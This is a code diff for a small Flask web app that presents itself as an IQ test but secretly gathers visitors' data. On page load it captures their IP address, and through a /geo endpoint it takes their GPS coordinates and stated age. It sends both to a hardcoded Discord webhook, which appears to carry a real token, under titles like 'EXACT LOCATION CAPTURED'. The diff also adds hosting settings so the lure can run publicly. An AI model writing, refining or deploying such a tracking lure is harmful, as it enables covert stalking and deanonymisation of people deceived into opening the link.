@@ -1,5 +1,6 @@
-from flask import Flask, render_template, request, redirect, jsonify
+import os
 import requests
+from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
@@ -8,38 +9,38 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnA
 
 @app.route('/')
 def index():
-    # Initial IP Log (Low accuracy)
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    requests.post(DISCORD_WEBHOOK_URL, json={
+    # Capture IP as soon as they open the link
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    payload = {
         "embeds": [{
-            "title": "👁️ New Visitor Opened IQ Test",
-            "description": f"**IP:** `{visitor_ip}`\nWaiting for GPS...",
+            "title": "👁️ New Visitor",
+            "description": f"**IP Address:** `{ip}`\nWaiting for IQ Test start...",
             "color": 3447003
         }]
-    })
+    }
+    try: requests.post(DISCORD_WEBHOOK_URL, json=payload)
+    except: pass
     return render_template('index.html')
 
 @app.route('/geo', methods=['POST'])
 def geo():
     data = request.json
-    lat = data.get('lat')
-    lon = data.get('lon')
-    age = data.get('age')
-
+    lat, lon, age = data.get('lat'), data.get('lon'), data.get('age')
+    
     payload = {
         "embeds": [{
-            "title": "📍 EXACT LOCATION FOUND (Surat/Real)",
+            "title": "📍 EXACT LOCATION CAPTURED",
             "color": 15158332,
             "fields": [
-                {"name": "Reported Age", "value": f"`{age}`", "inline": True},
-                {"name": "Google Maps", "value": f"[View Location](https://www.google.com{lat},{lon})", "inline": False},
-                {"name": "Coordinates", "value": f"`{lat}, {lon}`", "inline": False}
-            ],
-            "footer": {"text": "GPS Accuracy: High"}
+                {"name": "Age", "value": f"`{age}`", "inline": True},
+                {"name": "Maps", "value": f"[View on Google Maps](https://www.google.com{lat},{lon})", "inline": False}
+            ]
         }]
     }
     requests.post(DISCORD_WEBHOOK_URL, json=payload)
     return jsonify({"status": "ok"})
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    # This part fixes the 'No open ports' error on Render
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
